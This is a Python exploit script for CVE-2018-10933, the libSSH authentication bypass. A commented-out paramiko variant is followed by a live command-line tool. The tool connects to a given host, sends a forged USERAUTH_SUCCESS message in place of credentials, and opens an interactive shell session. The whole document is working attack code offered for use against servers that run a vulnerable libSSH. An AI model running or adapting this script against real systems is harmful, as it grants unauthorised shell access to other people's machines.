#!/usr/bin/env python
# Based on https://www.openwall.com/lists/oss-security/2018/08/16/1
# untested CVE-2018-10933 

# import sys, paramiko
# import logging

# username = sys.argv[1]
# hostname = sys.argv[2]
# command = sys.argv[3]

# new_auth_accept = paramiko.auth_handler.AuthHandler._handler_table[
#         paramiko.common.MSG_USERAUTH_SUCCESS]

# def auth_accept(*args, **kwargs):
#     return new_auth_accept(*args, **kwargs)

# paramiko.auth_handler.AuthHandler._handler_table.update({
#     paramiko.common.MSG_USERAUTH_REQUEST: auth_accept,
# })

# port = 22
# try:
#     logging.basicConfig(stream=sys.stderr, level=logging.DEBUG)
#     client = paramiko.SSHClient()
#     client.set_missing_host_key_policy(paramiko.WarningPolicy)
#     client.connect(hostname, port=port, username=username, password="", pkey=None, key_filename="fake.key")
#     stdin, stdout, stderr = client.exec_command(command)
#     print(stdout.read())
# finally:
#     client.close()

#!/usr/bin/env python3
import paramiko
import socket
import argparse
from sys import argv, exit


parser = argparse.ArgumentParser(description="libSSH Authentication Bypass")
parser.add_argument('--host', help='Host')
parser.add_argument('-p', '--port', help='libSSH port', default=22)

args = parser.parse_args()


def BypasslibSSHwithoutcredentials(hostname, port):
    sock = socket.socket()
    try:
        sock.connect((str(hostname), int(port)))

        message = paramiko.message.Message()
        transport = paramiko.transport.Transport(sock)
        transport.start_client()
  
        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
        transport._send_message(message)
    
        spawncmd = transport.open_session()
        spawncmd.invoke_shell()
        return 0
    
    except paramiko.SSHException as e:
        print("TCPForwarding disabled on remote/local server can't connect. Not Vulnerable")
        return 1
    except socket.error:
        print("Unable to connect.")
        return 1


def main():
    try:
        hostname = args.host
        port = args.port
    except:
        parser.print_help()
    BypasslibSSHwithoutcredentials(hostname, port)

if __name__ == '__main__':
    exit(main())